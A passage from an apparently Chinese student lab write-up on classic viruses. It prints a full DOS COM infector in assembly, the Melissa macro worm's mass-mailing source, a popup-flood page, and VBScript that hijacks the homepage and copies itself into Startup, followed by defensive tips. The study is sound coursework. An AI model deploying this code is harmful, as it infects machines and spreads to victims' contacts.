End Sub &#39;退出Sub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>学习了宏病毒的结构 和 去除宏病毒的方法</p>
<p>结构</p>
<ul>
<li><p>  屏蔽状态栏，以免显示宏病毒执行状态；修改公用模版是自动保存且不提示；自动执行病毒模板</p>
</li>
<li><p>  判断是否是 公用模板 ，否则复制到共用模板</p>
</li>
<li><p>  通过首行内容判断是否感染病毒</p>
</li>
<li><p>  执行病毒主体</p>
</li>
</ul>
<p>利用多开窗口等方式耗尽系统资源以影响使用</p>
<h2 id="COM病毒实验"><a href="#COM病毒实验" class="headerlink" title="COM病毒实验"></a>COM病毒实验</h2><ol>
<li>COM文件的特点</li>
</ol>
<p>COM文件是DOS的一种二进制代码的可执行文件，COM文件结构比较简单，加载过程十分迅速。整个程序只有一个段。因此全部代码长度必须小于64K，其入口代码地址是CS:100H。DOS装入COM文件时，先在内存建立一个长度为100H的程序前缀段(PSP，由DOS建立，是DOS用户程序和命令行之间的接口)，然后将整个文件装载于PSP上端，不进行重定位操作，接着将四个段地址寄存器DS(Data<br>Segment)，CS(Code Segment)，SS(Stack Segment)，ES(Extra Segment)初始化为程序前缀段(PSP)的段地址，最后将程序的控制权交于CS:100H处。如表一所示：</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image21.png" class="" width="21">

<p>表1：COM病毒的装入和执行</p>
<ol start="2">
<li>病毒原理</li>
</ol>
<p>COM病毒感染一般有两种途径，一种是将自身代码附加到宿主程序之前，病毒执行完后恢复寄生程序原先的状态，并用JMP<br>FAR等指令使程序再次回到CS:100H处，以确保寄生程序与PSP的一致。但更为常见的病毒为采用保存文件头若干字节，并将第一条指令改为”JMP<br>病毒入口”，以确保病毒最先执行。病毒执行完后，会恢复并运行原文件，以便传播，当其将原文件参数全部恢复后，会将控制权交于CS:100H处。</p>
<h4 id="带感染的COM文件"><a href="#带感染的COM文件" class="headerlink" title="带感染的COM文件"></a>带感染的COM文件</h4><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">proqram seqment

assume cs:program,ds:program,ss:program,es:program

org 0100h # 置程序的初值为100h，开始程序的运行
MOV AX, SEG MESSAGE # 将 message 段地址赋给AX寄存器
MOV DS, AX #
MOV DX, offset message #将偏移量赋给 DX
MOV AH, 09h #打印字符串
INT 21h
MOV AH, 4Ch # 终止程序 返回 DOS
INT 21h
RET

message db&quot;This a simple com program for a test ???&quot;,0dh,0ah,&quot;$&quot;

program ends

END<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>病毒的ASM文件</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">CSEG SEGMENT

ASSUME CS:CSEG,DS:CSEG,SS:CSEG

main PROC NEAR

mainstart:

CALL vstart ;病毒代码开始处

vstart:

POP SI #得到当前地址
MOV BP,SI #保存当前地址
PUSH SI
MOV AH,9
ADD SI,OFFSET message-OFFSET vstart #显示预设字符串
MOV DX,SI
INT 21h
POP SI
ADD SI,OFFSET yuan4byte-OFFSET vstart #取得原程序前四个字节
MOV DI,100h #目的地址
MOV AX,DS:[SI] #开始复制
MOV DS:[DI],AX
INC SI
INC SI
INC DI
INC DI
MOV AX,DS:[SI]
MOV DS:[DI],AX
MOV SI,BP #恢复地址值
MOV DX,OFFSET delname-OFFSET vstart #得到删除文件名
ADD DX,SI
MOV AH,41h
INT 21h
MOV DX,OFFSET filename-OFFSET vstart#得到要感染文件名
ADD DX,SI
MOV AL,02
MOV AH,3dhF#写文件
INT 21h

JC error
MOV BX,AX#文件句柄
MOV DX,OFFSET yuan4byte-OFFSET vstart#读文件前四个字节
ADD DX,SI
MOV CX,4
MOV AH,3fh
INT 21h
MOV AX,4202h#到文件尾
XOR CX,CX
XOR DX,DX
INT 21h
MOV DI,OFFSET new4byte-OFFSET vstart#保存要跳的地方
ADD DI,2
ADD DI,SI
SUB AX,4
MOV DS:[DI],AX
ADD SI,OFFSET mainstart-OFFSET vstart#准备写入病毒
MOV DX,SI
MOV vsizes,OFFSET vends-OFFSET mainstart
MOV CX,vsizes
MOV AH,40h
INT 21h
MOV SI,BP#定位到文件头
MOV AL,0
XOR CX,CX
XOR DX,DX
MOV AH,42h
INT 21h
MOV AH,40h#将新的文件头写入
MOV CX,4
MOV DX,OFFSET new4byte-OFFSET vstart
ADD DX,SI
INT 21h
MOV AH,3eh#关闭文件
INT 21h

error:

MOV AX,100h
PUSH AX
RET

main ENDP

yuan4byte:

RET ; ??

DB 3 DUP (?)

vsizes DW 0

new4byte DB &#39;M&#39;,0e9h,0,0

filename DB &quot;test.com&quot;,0

delname DB &quot;del.txt&quot;,0

message DB &quot;You are infected by a simple com virus~~&quot;

DB 0dh,0ah,&quot;$&quot;

vends:

start:

MOV AX,CSEG
MOV DS,AX
MOV SS,AX
CALL main
MOV AX,4c00h
INT 21h
CSEG ENDS
END start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>分析的有趣的点</p>
<ol>
<li><p> DOS下com文件的加载时一对一的映射的，没有PE结构那样的MZ头和PE头</p>
</li>
<li><p> COM文件加载代码的基址是100H，0~100H是PSP结构，COM文件只有一个段，所以DS，ES……段寄存器都指向PSP</p>
</li>
<li><p> COM文件没有堆栈段，用debug调试发现，sp：FFFE，bp：0000，bp寄存器经过测试可以用来存储其他的值对运行没有影响</p>
</li>
<li><p> 病毒代码使用call pop组合拿到pop处代码的绝对地址，以实现重定位</p>
</li>
<li><p>通过对被感染文件的前4字节填充为 sub bp， jmp<br> shellcode实现shellcode跳转，进入shellcode首先恢复前4字节，然后执行完流程后通过push<br> 100H,ret返回原程序</p>
</li>
<li><p> 在这里M除了躲避杀毒软件的查杀我没想到其他作用，删掉不影响运行（但是首地址的jmp的目标地址需要对应的修改）</p>
</li>
<li><p> yuan4byte中ret的作用：让病毒程序返回Main函数，成功运行完整个流程</p>
</li>
<li><p>为什么要SUB<br> AX,4：类似于inline-hook，jmp相对地址，需要减去jmp语句所在的偏移地址再-jmp本身的长度</p>
</li>
</ol>
<h2 id="梅丽莎病毒实验"><a href="#梅丽莎病毒实验" class="headerlink" title="梅丽莎病毒实验"></a>梅丽莎病毒实验</h2><p>代码</p>
<pre class="line-numbers language-visual" data-language="visual"><div class="caption"><span>basic</span></div><code class="language-visual">Sub autoOpen()

On Error Resume Next

&#39;*
修改注册表，循环发送邮件程序部分

If System.PrivateProfileString(&quot;&quot;
,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice11.0WordSecurity&quot;,
&quot;Level&quot;) &lt;&gt; &quot;&quot; Then &#39;注册表项判断

CommandBars(&quot;Macro&quot;).Controls(&quot;Security...&quot;).Enabled &#x3D; False

&#39;宏工具栏安全选项失效

System.PrivateProfileString(&quot;&quot;,
&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice11.0WordSecurity&quot;,
&quot;Level&quot;) &#x3D; 1&amp;

Else

CommandBars(&quot;Tools&quot;).Controls(&quot;Macro&quot;).Enabled &#x3D; False

&#39;工具菜单栏宏选项失效

Options.ConfirmConversions &#x3D; (1-1): &#39;文件转换对话框不显示

Options.VirusProtection &#x3D; (1-1): &#39;宏警告对话框不显示

Options.SaveNormalPrompt &#x3D; (1-1) &#39;Normal.dot被修改后不显示对话框

End If

Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice

Set UngaDasOutlook &#x3D; CreateObject(&quot;Outlook.Application&quot;)

&#39;创建outlook应用程序实例对象

Set DasMapiName &#x3D; UngaDasOutlook.GetNameSpace(&quot;MAPI&quot;)

&#39;获取MAPI对象

If System.PrivateProfileString(&quot;&quot;,
&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice&quot;, &quot;Melissa&quot;)
&lt;&gt; &quot;... by Kwyjibo&quot; Then

If UngaDasOutlook &#x3D; &quot;Outlook&quot; Then

DasMapiName.Logon &quot;profile&quot;, &quot;password&quot;

For y &#x3D; 1 To DasMapiName.AddressLists.Count

&#39;遍历地址簿，进行邮件发送操作

Set AddyBook &#x3D; DasMapiName.AddressLists(y)

x &#x3D; 1

Set BreakUmOffASlice &#x3D; UngaDasOutlook.CreateItem(0)

For oo &#x3D; 1 To AddyBook.AddressEntries.Count

Peep &#x3D; AddyBook.AddressEntries(x)

&#39;获取第 x 个收件人的收件地址

BreakUmOffASlice.Recipients.Add Peep

&#39;加入收件人的地址

x &#x3D; x + 1

If x &gt; 50 Then oo &#x3D; AddyBook.AddressEntries.Count

Next oo

BreakUmOffASlice.Subject&#x3D; &quot;Important Message From &quot; &amp;
Application.UserName &#39;设置邮件的主题

BreakUmOffASlice.Body &#x3D; &quot;Here is that document you asked for ...
don&#39;t show anyone else ;-)&quot; &#39;设置邮件的内容

BreakUmOffASlice.Attachments.Add ActiveDocument.FullName &#39;加入附件

BreakUmOffASlice.Send &#39;发送邮件

Peep &#x3D; &quot;&quot;

Next y

DasMapiName.Logoff &#39;断开连接

End If

System.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice&quot;,
&quot;Melissa?&quot;) &#x3D; &quot;... by Kwyjibo&quot; &#39; 设置感染标志

End If

&#39;*First
Part

Set ADI1 &#x3D; ActiveDocument.VBProject.VBComponents.Item(1)

&#39;获取当前文档VBA工程第一个模块的名称

Set NTI1 &#x3D; NormalTemplate.VBProject.VBComponents.Item(1)

&#39;获取Normal.dot VBA工程第一个模块的名称

NTCL &#x3D; NTI1.CodeModule.CountOfLines

ADCL &#x3D; ADI1.CodeModule.CountOfLines

BGN &#x3D; 2

If ADI1.Name &lt;&gt; &quot;Melissa&quot; Then &#39;如果当前文档为感染

If ADCL &gt; 0 Then ADI1.CodeModule.DeleteLines 1, ADCL

Set ToInfect &#x3D; ADI1

ADI1.Name &#x3D; &quot;Melissa&quot;

DoAD &#x3D; True

End If

If NTI1.Name &lt;&gt; &quot;Melissa&quot; Then&#39;如果 Normal.dot 未感染

If NTCL &gt; 0 Then NTI1.CodeModule.DeleteLines 1, NTCL

Set ToInfect &#x3D; NTI1

NTI1.Name &#x3D; &quot;Melissa&quot; &#39;修改VBA工程第一个模块为 Mellisa

DoNT &#x3D; True

End If

If DoNT &lt;&gt; True And DoAD &lt;&gt; True Then GoTo CYA

&#39;开始感染 Normal.dot

If DoNT &#x3D; True Then

Do While ADI1.CodeModule.Lines(1, 1) &#x3D; &quot;&quot;

ADI1.CodeModule.DeleteLines 1

Loop

ToInfect.CodeModule.AddFromString (&quot;Private Sub Document_Close()&quot;)

Do While ADI1.CodeModule.Lines(BGN, 1) &lt;&gt; &quot;&quot;

ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)

BGN &#x3D; BGN + 1

Loop

End If

If DoAD &#x3D; True Then &#39;开始感染当前文档

Do While NTI1.CodeModule.Lines(1, 1) &#x3D; &quot;&quot;

NTI1.CodeModule.DeleteLines 1

Loop

ToInfect.CodeModule.AddFromString (&quot;Private Sub Document_Open()&quot;)

Do While NTI1.CodeModule.Lines(BGN, 1) &lt;&gt; &quot;&quot;

ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)

BGN &#x3D; BGN + 1

Loop

End If

CYA:

&#39;保存被修改的当前文档和Normal.dot

If NTCL &lt;&gt; 0 And ADCL &#x3D; 0 And (InStr(1, ActiveDocument.Name,
&quot;Document&quot;) &#x3D; False) Then

ActiveDocument.SaveAs FileName:&#x3D;ActiveDocument.FullName

ElseIf (InStr(1, ActiveDocument.Name, &quot;Document&quot;) &lt;&gt; False) Then

ActiveDocument.Saved &#x3D; True

End If

&#39;WORD&#x2F;Melissa written by Kwyjibo

&#39;Works in both Word 2000 and Word 97

&#39;Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!

&#39;Word -&gt; Email | Word 97 &lt;--&gt; Word 2000 ... it&#39;s a new age!

If Day(Now) &#x3D; Minute(Now) Then

Selection.TypeText &quot; Twenty-two points, plus triple-word-score, plus
fifty points for using all my letters. Game&#39;s over. I&#39;m outta
here.&quot;

End Sub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<ol>
<li><p> 修改注册表</p>
</li>
<li><p> 发送邮件</p>
</li>
</ol>
<h2 id="HTML病毒"><a href="#HTML病毒" class="headerlink" title="HTML病毒"></a>HTML病毒</h2><h4 id="无限跳窗口病毒"><a href="#无限跳窗口病毒" class="headerlink" title="无限跳窗口病毒"></a>无限跳窗口病毒</h4> <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body<span class="token operator">></span>

<span class="token operator">&lt;</span><span class="token constant">A</span> href<span class="token operator">=</span><span class="token string">""</span> onmouseover<span class="token operator">=</span><span class="token string">"while(true)&#123;window.open()&#125;"</span><span class="token operator">></span>恶意弹出窗口！<span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">A</span><span class="token operator">></span>
 
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将此病毒运行在现实中的 chrome 浏览器上，系统提示<br>阻止弹出窗口，表明现行的浏览器已经对这种病毒进行了防护</p>
<h4 id="更改主页病毒"><a href="#更改主页病毒" class="headerlink" title="更改主页病毒"></a>更改主页病毒</h4><p>通过 VbScript 嵌入 html 的 script 标签， 嵌入一段vb代码</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>META</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>Content-Type</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html:charset=gb2312<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HEAD</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCRIPT</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>vbscript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">

Sub <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

Dim TheForm

Set TheForm<span class="token operator">=</span>Document<span class="token punctuation">.</span>forms（<span class="token string">"myform"</span>）

strKey<span class="token operator">=</span><span class="token string">"HKEY_CURRENT_USERSoftwarellicrosoftInternetExplorerMain"</span>

strValue<span class="token operator">=</span><span class="token string">"Start Page"</span>

strData<span class="token operator">=</span><span class="token string">"http://www.simpleware.com.cn"</span>

strType <span class="token operator">=</span><span class="token string">"REG_SZ"</span>

regAdd strKey，strValue，strData，strType

End Sub

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>上方 main script主体，调用regAdd 函数 进行注册表项的更改<span class="token operator">--</span><span class="token operator">></span>

<span class="token keyword">function</span> regAdd（strKey，strValue，strData，strType）

Dim Wshshell

Set WshShell<span class="token operator">=</span>CreateObject（<span class="token string">"WScript.Shell"</span>）

WshShell<span class="token punctuation">.</span>RegWrite strKey <span class="token operator">&amp;</span> <span class="token string">""</span> <span class="token operator">&amp;</span> strValue<span class="token punctuation">,</span>strData<span class="token punctuation">,</span>strType

<span class="token operator">&lt;</span><span class="token operator">!</span>通过 shell 文件进行注册表项的改写<span class="token operator">></span>

msgbox（<span class="token string">"Successful"</span>）

<span class="token operator">&lt;</span><span class="token operator">!</span>改写成功后 显示 successful<span class="token operator">></span>

end <span class="token keyword">function</span>

</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCRIPT</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HEAD</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>main()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
修改主页
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image22.jpeg" class="" width="22">

<p>注册表修改成功</p>
<p>五、防治方法：<br>5.1要避免被网页恶意代码感染，首先关键是不要轻易去一些并不信任的站点。<br>5.2IE点击”工具–&gt;Internet选项–&gt;安全–&gt;Internet区域的安全级别”，把安全级别由”中”改为”高”。<br>5.3具体方案是：在IE窗口中点击”工具—&gt;Internet选项”，在弹出的对话框中选择”安全”标签，再点击”自定义级别”按钮，就会弹出”安全设置”对话框，把其中所有Acti<br>veX插件和控件以及与Java相关全部选项选择”禁用”。<br>5.4一定要在计算机上安装防火墙，并要时刻打开”实时监控功能”。<br>5.5在注册表的KEY<em>CURRENT</em>USERSoftwareMicrosoftWindwsCurrentVersionPoliciesSystem下，增加名为DisableRegistryTools的DWORD值项，将其值改为”1”，即可禁止使用注册表编辑器命令regedit.exe。<br>5.6因为特殊原因需要修改注册表，可应用如下解锁方法：开始因为特殊原因需要修改注册表，可应用如下解锁方法：运行—&gt;gpedit.msc打开组策略左面分级展开用户配置—&gt;管理模板—–&gt;系统右面有个阻止访问注册表编辑工具设置成已禁用确定即可。<br>5.7随时升级IE浏览器的补丁。<br>【实验思考】<br>1.可根据”几个相关修改”中提到的注册表中值，利用”更改主页”中修改注册表的方法，来进行自己的注册表修改，并给出如何防范和修复。</p>
<h2 id="脚本病毒"><a href="#脚本病毒" class="headerlink" title="脚本病毒"></a>脚本病毒</h2><p>自动拷贝到开始菜单启动栏项</p>
<blockquote>
<p>On Error Resume Next’启动或关闭一个错误处理常式</p>
<p>Set<br>fs=CreateObject(“Scripting.FileSystemobject”)’创建并返回一个对Activex对象的引用</p>
<p>Set diro=fs.GetSpecialFolder(0)’取系统路径C:windows</p>
<p>dirl=Mid(dir0,1,InStr(dir0,”:”))’取系统盘符</p>
<p>Set so=CreateObject（”Scripting.FileSystemObject”）</p>
<p>dim r’定义变量</p>
<p>Set r=Create0bject(“Wscript.Shel1”)’创建并返回一个对<br>Activex对象的引用</p>
<p>so.GetFile(WScript.ScriptFullName).Copy(dirl&amp;”Documents and<br>SettingsAdministrator[开始]菜单程序启动Win32system.vbs”)</p>
<p>‘拷贝文件</p>
</blockquote>
<h2 id="病毒分析-1"><a href="#病毒分析-1" class="headerlink" title="病毒分析"></a>病毒分析</h2><p>文件监控</p>
<p>学会了Process Monitor 的使用，这个软件现在仍然活跃在今日的舞台</p>
<p>1.8注意，不要把explorer.exe和iexplore.exe这两个进程过滤掉，因为病毒经常要注入代码到这两个进程中完成特别的功能。如果过滤掉这两个进程，那么就无法监控到被注入到这两个进程的代码所进行的文件操作。</p>
<p>注册表监控 ： 根据 operation 过滤项，查看 RegSetValue<br>即更改了注册表项的进程</p>
<p>进程监控二 ： 学会使用 Process Explorer</p>
<p>网络监控：利用 TcpView 工具进行 端口，进程的网络连接监控，netspy<br>进行侵入并打开7306端口等待 netmonitor 的监控，可以查看计算机中的文件</p>
<p>全面监控： 利用 InCtrl5 对安装程序的安装过程进行文件，注册表项，INI，TXT<br>文件的全面跟踪，从而实现对安装过程的全面了解，并生成一份报告，供查阅</p>
<h1 id="致-谢"><a href="#致-谢" class="headerlink" title="致 谢"></a>致 谢</h1><p>感谢老师 和 学长的帮助和指导</p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Dingsoul</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://dingiso.github.io/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/">https://dingiso.github.io/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">Dingsoul</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/network/">
                                    <span class="chip bg-color">network</span>
                                </a>
                            
                                <a href="/tags/virus/">
                                    <span class="chip bg-color">virus</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
